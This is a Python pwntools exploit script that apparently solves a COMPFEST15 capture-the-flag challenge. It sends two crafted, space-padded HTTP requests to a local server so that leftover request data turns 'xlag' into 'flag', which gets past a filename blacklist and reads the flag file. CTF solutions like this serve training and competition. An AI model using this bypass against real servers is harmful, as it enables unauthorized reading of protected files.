from pwn import *

context.log_level = "debug"


def exploit():
    # Goal: GET //home/flag.txt
    try:
        # =-=-=-= Initial Request =-=-=-=
        # from -> ''
        # to   -> 'GET  /home/xlag.txt'
        io = remote('127.0.0.1', 8080)
        payload = f"GET{' ' * (0x20-3)}/home/xlag.txt?password=fib HTTP/1.1"
        io.send(payload.encode())

        # =-=-=-= Bypass 'flag' blacklist =-=-=-=
        # from -> 'GET  /home/xlag'
        # to   -> 'GET //home/flag'
        io = remote('127.0.0.1', 8080)
        payload = f"GET{' ' * (0x20-4)}//home/f"
        io.send(payload.encode())
        out = io.recv()

        # =-=-=-= Profit =-=-=-=
        prefix = b"COMPFEST15{"
        if prefix in out:
            flag = prefix + out.split(prefix)[-1]

        log.success(f"flag: {flag.decode()}")
        io.close()
    except Exception as e:
        print(e)
        io.close()


while True:
    exploit()
    sleep(1)
